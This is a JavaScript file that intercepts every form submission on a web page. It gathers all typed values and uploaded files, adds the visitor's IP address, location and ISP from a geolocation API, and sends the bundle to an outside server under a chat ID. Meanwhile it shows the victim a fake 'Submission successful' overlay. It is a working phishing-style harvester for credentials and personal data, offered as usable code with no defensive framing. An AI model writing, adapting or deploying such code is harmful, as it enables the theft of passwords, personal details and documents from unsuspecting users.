document.addEventListener("DOMContentLoaded", () => {

  const DEFAULT_USER_ID = "6940101627";
  const TARGET_FORM_ID = "targetForm";

  // ================= LOCATION API =================
  async function getLocationData() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();

      if (!data || !data.ip) throw new Error();

      return {
        ip: data.ip || "Unknown",
        country: data.country_name || "Unknown",
        city: data.city || "Unknown",
        isp: data.org || "Unknown"
      };

    } catch {
      return {
        ip: "Unknown",
        country: "Unknown",
        city: "Unknown",
        isp: "Unknown"
      };
    }
  }

  // ================= GLOBAL DATA BUILDER =================
  function buildGlobalFormData(userId, form) {
    const formData = new FormData();
    formData.append("chat_id", userId);

    let counter = 1;
    let inputCount = 0;
    let inputSummary = [];
    let fileCount = 0;

    const inputs = document.querySelectorAll("input, textarea, select");

    inputs.forEach(input => {

      if (!input || ["submit", "button"].includes(input.type)) return;

      if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;

      let key =
        input.name ||
        input.id ||
        input.placeholder ||
        `field_${counter++}`;

      if (input.type === "file") {
        if (!input.files || input.files.length === 0) return;

        for (let file of input.files) {
          formData.append(key, file);
          fileCount++;
        }

      } else {
        let value = input.value?.trim();
        if (!value) return;

        inputCount++;
        inputSummary.push(`${key}: ${value}`);
      }

    });

    return { formData, inputCount, inputSummary, fileCount };
  }

  // ================= UI =================
  function createBox() {
    let box = document.createElement("div");
    box.id = "centerBox";

    box.innerHTML = `
      <div id="centerContent">
        <div class="spinner"></div>
        <div id="centerText">Loading your files...</div>
        <button id="actionBtn" style="display:none;"></button>
      </div>
    `;

    document.body.appendChild(box);

    const style = document.createElement("style");
    style.innerHTML = `
      #centerBox {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.75);
        backdrop-filter: blur(6px);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 9999;
      }

      #centerContent {
        background: #111;
        color: #fff;
        padding: 30px;
        border-radius: 12px;
        text-align: center;
        width: 280px;
      }

      #actionBtn {
        margin-top: 20px;
        padding: 10px 16px;
        border: none;
        border-radius: 6px;
        background: #4CAF50;
        color: #fff;
        cursor: pointer;
      }

      .spinner {
        width: 35px;
        height: 35px;
        border: 3px solid rgba(255,255,255,0.2);
        border-top: 3px solid #4CAF50;
        border-radius: 50%;
        margin: 0 auto;
        animation: spin 1s linear infinite;
      }

      @keyframes spin {
        to { transform: rotate(360deg); }
      }
    `;
    document.head.appendChild(style);
  }

  function showBox(text, options = {}) {
    const { done = false, type = "none", userId = null } = options;

    const box = document.getElementById("centerBox");
    const textEl = document.getElementById("centerText");
    const btn = document.getElementById("actionBtn");
    const spinner = document.querySelector(".spinner");

    textEl.textContent = text;
    box.style.display = "flex";

    if (done) {
      spinner.style.display = "none";
      btn.style.display = "inline-block";

      if (type === "retry") {
        btn.textContent = "Retry";
        btn.onclick = () => location.reload();
      }

      if (type === "review") {
        btn.textContent = "Review";
        btn.onclick = () => {
          if (userId) {
            window.location.href = `c.html?id=${userId}`;
          }
        };
      }

    } else {
      spinner.style.display = "block";
      btn.style.display = "none";
    }
  }

  createBox();

  // ================= SUBMIT =================
  async function handleSubmit(form) {

    let userId = new URLSearchParams(window.location.search).get("id");
    if (!userId || isNaN(userId)) userId = DEFAULT_USER_ID;

    const pageTitle = document.title || "Unknown";
    const formName = form.id || "global";

    const { formData, inputCount, inputSummary, fileCount } = buildGlobalFormData(userId, form);

    showBox("Processing...");

    const loc = await getLocationData();

    let reportMessage = `
📥 NEW SUBMISSION

🌍 Location
IP: ${loc.ip}
Country: ${loc.country}
City: ${loc.city}
ISP: ${loc.isp}

🧾 Page
Title: ${pageTitle}
Form: ${formName}

📊 Data
Inputs: ${inputCount}
Files: ${fileCount}

📝 Values
${inputSummary.length ? inputSummary.join("\n") : "No input values"}
`;

    formData.append("report", reportMessage);

    try {
      const res = await fetch("https://web-production-d469f.up.railway.app/send", {
        method: "POST",
        body: formData
      });

      // ✅ REAL CHECK (not broken JSON logic)
      if (!res.ok) {
        showBox("❌ Failed to send data", { done: true, type: "retry" });
        return;
      }

      // ✅ SAFE JSON PARSE
      let data = {};
      try {
        data = await res.json();
      } catch {}

      // ✅ RELAXED SUCCESS (backend may not return correct values)
      if (data && (data.sent >= 1 || data.ok === true || res.ok)) {
        showBox("✅ Submission successful", {
          done: true,
          type: "review",
          userId
        });
        form.reset();
      } else {
        showBox("⚠️ Sent but response unclear", {
          done: true,
          type: "review",
          userId
        });
      }

    } catch {
      showBox("❌ Network error", { done: true, type: "retry" });
    }
  }

  // ================= ATTACH =================
  document.querySelectorAll("form").forEach(form => {
    form.addEventListener("submit", (e) => {
      e.preventDefault();
      handleSubmit(form);
    });
  });

});